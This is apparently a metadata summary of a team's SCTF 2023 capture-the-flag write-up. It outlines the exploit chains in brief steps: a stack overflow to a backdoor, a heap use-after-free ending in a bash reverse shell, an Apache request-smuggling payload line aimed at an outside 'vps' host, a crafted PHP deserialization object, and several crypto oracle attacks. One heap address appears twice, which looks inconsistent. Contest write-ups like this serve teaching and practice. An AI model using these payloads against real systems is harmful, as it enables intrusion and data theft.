...
quality: high
full_path: SCTF_2023_Writeup_-Polaris战队.full.md
meta_path: SCTF_2023_Writeup_-Polaris战队.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: SCTF 2023 Writeup - Polaris 战队。SCTF 2023 Polaris 战队多方向 WP：PWN CGI ret2text + Rust Vec UAF 改 free_hook + Web CVE-2023-25690 请求走私 + PHP 反序列化 + RE z3 求解 + 硬件电路 + Crypto 椭圆曲线 + AES Padding/MSB Oracle。。...
category: misc
...
contest_type: open
wp_url: https://www.ctfiot.com/121322.html
reasoning_chain:
- PWN ancient_cgi scanf 栈溢出 + vip 函数 0x401129 → 触发点：ret2vip
- cyclic(88) padding + p64(vip) + p64(main) → 弹 vip 触发后门
- PWN Brave Knights Rust Vec::grow UAF → tcache 0x3ed8e8 __free_hook 0x3ed8e8
- 512 push(6) + grow(0x400) + A→B→A 构成 UAF → __free_hook=system + bash 反弹
- WEB ezcheck1n CVE-2023-25690 Apache HTTP 请求走私 → 触发：HTTP/1.1 CRLF
- 'payload: /2023/1 HTTP/1.1\r\nHost:localhost\r\n\r\nGET /2022.php?url=vps:445'
- WEB fumo_backdoor PHP 反序列化 → O:13:"fumo_backdoor":4 触发 phpinfo + readfile
- RE Syclang 24 字节 z3 求解 → 双层 L/R/X 加减 + XOR 还原 → flag
- Crypto Barter 椭圆曲线 smooth n → 离散对数爆破 4 bit seq → flag
- Crypto Math forbidden AES-CBC + RSA → Padding oracle 解 AES key → MSB oracle 解密 RSA
failed_attempts:
- PWN 试图覆盖 __free_hook → 失败：需要先 leak libc 才能算偏移
- WEB fumo 试图用普通反序列化 → 失败：必须构造 fumo_backdoor 完整字段
- Crypto 试图直接解 RSA → 失败：必须先还原 aeskey 才能解 sysKEY
key_observations:
- Rust Vec::grow UAF 是 Rust 二进制程序漏洞常见入口
- CVE-2023-25690 Apache HTTP 请求走私是 web 经典高阶利用
- MSB Oracle + Padding Oracle 组合攻击 RSA+AES 是 CBC+RSA 联合加密场景必备
- PHP 反序列化字段未过滤（path/argv/func/class 任意）可触发 readfile
prerequisites:
- Rust Vec 内存模型 + tcache 利用
- HTTP Request Smuggling 协议层知识
- PHP 反序列化 + pop chain
- z3 / AES-CBC / RSA Padding+MSB Oracle
---
